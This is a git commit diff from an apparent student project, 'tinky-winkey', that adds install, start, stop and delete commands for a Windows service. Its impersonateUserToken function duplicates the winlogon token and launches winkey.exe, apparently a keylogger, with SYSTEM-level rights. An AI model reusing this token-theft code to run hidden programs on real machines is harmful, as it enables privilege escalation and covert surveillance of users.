d8f176e6727c587c9db27dbe28695a413e1baa69
Tactoe <tmilon@student.42.fr>
2022-07-09 18:12:48 +0200

    Service install start stop delete

--- tinky/main.c
+++ tinky/main.c
@@ -62,27 +62,12 @@ BOOL SetPrivilege(
 	return TRUE;
 }
 
-// char* get_username()
-// {
-// 	TCHAR username[UNLEN + 1];
-// 	DWORD username_len = UNLEN + 1;
-// 	GetUserName(username, &username_len);
-// 	std::wstring username_w(username);
-// 	std::string username_s(username_w.begin(), username_w.end());
-// 	return username_s;
-// }
-
 void impersonateUserToken()
 {
     HANDLE winlogonTokenHandle;
     HANDLE winlogonDuplicateTokenHandle;
 
     DWORD WINLOGON_PID = 1412;
-
-	STARTUPINFO startupInfo;
-	PROCESS_INFORMATION processInformation;
-	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
-	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
 
     HANDLE currentTokenHandle = NULL;
 	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentTokenHandle);
@@ -112,20 +97,6 @@ void impersonateUserToken()
 	
 	CloseHandle(processHandle);
 
-	// BOOL impersonateUser = ImpersonateLoggedOnUser(winlogonTokenHandle);
-	// if (GetLastError() == NULL)
-	// {
-	// 	printf("[+] ImpersonatedLoggedOnUser() success!\n");
-	// 	//printf("[+] Current user is: %s\n", get_username().c_str());
-	// 	printf("[+] Reverting thread to original user context\n");
-	// 	RevertToSelf();
-	// }
-	// else
-	// {
-	// 	printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
-	// 	printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
-	// }	
-
 	// Call DuplicateTokenEx(), print return code and error code
 	BOOL duplicateToken = DuplicateTokenEx(winlogonTokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &winlogonDuplicateTokenHandle);
 	if (GetLastError() == NULL)
@@ -136,32 +107,28 @@ void impersonateUserToken()
 		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
 	}
 
-	//CreateService();
 
 	// Call CreateProcessWithTokenW(), print return code and error code
-	// BOOL createProcess = CreateProcessWithTokenW(winlogonDuplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
-	// if (GetLastError() == NULL)
-	// 	printf("[+] Process spawned!\n");
-	// else
-	// {
-	// 	printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
-	// 	printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
-	// }
+	BOOL createProcess = CreateProcessWithTokenW(winlogonDuplicateTokenHandle, LOGON_WITH_PROFILE, L"D:\\42\\tinky-winkey\\winkey\\winkey.exe", NULL, 0, NULL, NULL, NULL, NULL);
+	if (GetLastError() == NULL)
+		printf("[+] Process spawned!\n");
+	else
+	{
+		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
+		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
+	}
 
 
     CloseHandle(winlogonTokenHandle);
 	CloseHandle(winlogonDuplicateTokenHandle);
-    // Get a handle to the SCM database. 
-
 }
 
 void installService()
 {
-	printf("about to start\n");
 	SC_HANDLE schSCManager;
 	SC_HANDLE schService;
-    TCHAR servicePath = "D:\42\tinky-winkey\winkey\winkey.exe";   
-	TCHAR serviceName = SVCNAME;
+    TCHAR *servicePath = "d:\\42\\tinky-winkey\\tinky\\tinky.exe";   
+	TCHAR *serviceName = SVCNAME;
 	schSCManager = OpenSCManager( 
         NULL,                    // local computer
         NULL,                    // ServicesActive database 
@@ -173,8 +140,6 @@ void installService()
         printf("OpenSCManager failed (%d)\n", GetLastError());
         return;
     }
-	printf("opened\n");
-
   
 	schService = CreateService( 
         schSCManager,              // SCM database 
@@ -191,7 +156,6 @@ void installService()
         NULL,                      // LocalSystem account 
         NULL);                     // no password 
  
-	printf("creatededed\n");
     if (schService == NULL) 
     {
         printf("CreateService failed (%d)\n", GetLastError()); 
@@ -199,19 +163,20 @@ void installService()
         return;
     }
     else printf("Service installed successfully\n"); 
-	printf("installeded\n");
 
     CloseServiceHandle(schService); 
     CloseServiceHandle(schSCManager);
 
 }
 
-void startService()
+void toggleService(BOOL startService)
 {
 	SC_HANDLE schSCManager;
 	SC_HANDLE schService;
-    TCHAR servicePath = "D:\42\tinky-winkey\winkey\winkey.exe";   
-	TCHAR serviceName = SVCNAME;
+	TCHAR *serviceName = SVCNAME;
+	DWORD dwBytesNeeded;
+	SERVICE_STATUS_PROCESS ssp;
+
 	schSCManager = OpenSCManager( 
         NULL,                    // local computer
         NULL,                    // ServicesActive database 
@@ -223,8 +188,87 @@ void startService()
         printf("OpenSCManager failed (%d)\n", GetLastError());
         return;
     }
-	printf("opened\n");
 
+    schService = OpenService( 
+        schSCManager,         // SCM database 
+        serviceName,            // name of service 
+        SERVICE_ALL_ACCESS);  // full access 
+ 
+    if (schService == NULL)
+    { 
+        printf("OpenService failed (%d)\n", GetLastError()); 
+        CloseServiceHandle(schSCManager);
+        return;
+    }    
+	if (startService)
+	{
+		if (!StartService(
+				schService,  // handle to service 
+				0,           // number of arguments 
+				NULL) )      // no arguments 
+		{
+			printf("StartService failed (%d)\n", GetLastError());
+			goto stop_cleanup;
+		}
+		else printf("Service start pending...\n"); 
+	}
+	else
+	{
+		if ( !QueryServiceStatusEx( 
+            schService, 
+            SC_STATUS_PROCESS_INFO,
+            (LPBYTE)&ssp, 
+            sizeof(SERVICE_STATUS_PROCESS),
+            &dwBytesNeeded ) )
+		{
+			printf("QueryServiceStatusEx failed (%d)\n", GetLastError()); 
+			goto stop_cleanup;
+		}
+
+		if ( ssp.dwCurrentState == SERVICE_STOPPED )
+		{
+			printf("Service is already stopped.\n");
+			goto stop_cleanup;
+		}
+		//StopDependentServices();
+
+		// Send a stop code to the service.
+
+		if ( !ControlService( 
+				schService, 
+				SERVICE_CONTROL_STOP, 
+				(LPSERVICE_STATUS) &ssp ) )
+		{
+			printf( "ControlService failed (%d)\n", GetLastError() );
+			goto stop_cleanup;
+		}
+
+	}
+
+
+stop_cleanup:
+    CloseServiceHandle(schService); 
+    CloseServiceHandle(schSCManager);
+
+}
+
+void deleteService()
+{
+	SC_HANDLE schSCManager;
+	SC_HANDLE schService;
+    TCHAR *servicePath = "d:\\42\\tinky-winkey\\tinky\\tinky.exe";   
+	TCHAR *serviceName = SVCNAME;
+	schSCManager = OpenSCManager( 
+        NULL,                    // local computer
+        NULL,                    // ServicesActive database 
+        SC_MANAGER_ALL_ACCESS);  // full access rights 
+
+
+    if (NULL == schSCManager) 
+    {
+        printf("OpenSCManager failed (%d)\n", GetLastError());
+        return;
+    }
 
     schService = OpenService( 
         schSCManager,         // SCM database 
@@ -238,23 +282,36 @@ void startService()
         return;
     }    
 
-	printf("creatededed\n");
-    if (schService == NULL) 
-    {
-        printf("CreateService failed (%d)\n", GetLastError()); 
-        CloseServiceHandle(schSCManager);
-        return;
-    }
-    else printf("Service installed successfully\n"); 
-	printf("installeded\n");
+ 
+	BOOL serviceDeleted = DeleteService(schService);
+    if (serviceDeleted == NULL)
+    { 
+        printf("DeleteService failed (%d)\n", GetLastError()); 
+    }    
+	else printf("Service successfully deleted");
+  
 
     CloseServiceHandle(schService); 
     CloseServiceHandle(schSCManager);
-
 }
 
-int main()
-{
-	impersonateUserToken();
-    return 0;
+int main(int argc, char *argv[]) {
+
+	if (argc != 2)
+	{
+		printf("BAD");
+	}
+	else
+	{
+		if (strcmp(argv[1], "install") == 0)
+			installService();
+		else if (strcmp(argv[1], "start") == 0)
+			toggleService(TRUE);
+		else if (strcmp(argv[1], "stop") == 0)
+			toggleService(FALSE);
+		else if (strcmp(argv[1], "delete") == 0)
+			deleteService();
+	}
+
+	return 0;
 }
